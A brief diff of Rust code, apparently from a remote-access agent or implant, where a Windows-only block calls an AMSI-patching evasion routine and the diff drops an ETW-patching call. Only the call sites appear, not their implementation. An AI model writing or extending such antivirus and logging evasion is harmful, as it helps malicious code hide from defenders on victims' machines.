@@ -52,7 +52,6 @@ impl Agent {
         #[cfg(windows)]
         unsafe {
             evasion::patch_amsi();
-            evasion::patch_etw();
         }
 
         let cfg = config::load_config()?;
